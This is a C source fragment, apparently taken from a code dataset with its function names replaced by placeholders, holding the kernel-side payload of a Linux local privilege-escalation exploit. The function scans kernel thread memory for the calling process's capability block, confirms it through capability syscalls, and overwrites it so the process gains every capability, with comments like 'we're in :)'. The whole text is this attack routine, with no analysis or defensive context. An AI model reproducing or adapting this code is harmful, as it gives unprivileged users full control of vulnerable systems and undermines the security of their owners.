#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct __user_cap_header_struct {int version; scalar_t__ pid; } ;
struct __user_cap_data_struct {unsigned long effective; unsigned long inheritable; unsigned long permitted; } ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (struct __user_cap_header_struct*,struct __user_cap_data_struct*) ; 
 scalar_t__* clear1 ; 

void FUNC1(unsigned long *ts)
{
/* must be on lower addresses because of kernel arg check :) */
static struct __user_cap_header_struct head;
static struct __user_cap_data_struct data;
static struct __user_cap_data_struct n;

int i;

*clear1 = 0;
head.version = 0x19980330;
head.pid = 0;
FUNC0(&head, &data);
/* scan the thread_struct */
for (i = 0; i < 512; i++, ts++) 
{
	/* is it capabilities block? */
	if (  (ts[0] == data.effective) &&
		(ts[1] == data.inheritable) &&
		(ts[2] == data.permitted)) 
	{
		/* set effective cap to some val */
		ts[0] = 0x12341234;
		FUNC0(&head, &n);
		/* and test if it has changed */
		if (n.effective == ts[0]) 
		{
			/* if so, we're in :) */
			ts[0] = ts[1] = ts[2] = 0xffffffff;
			return;
		}
		/* otherwise fix back the stuff
		(if we've not crashed already :) */
		ts[0] = data.effective;
	}
}
return;
}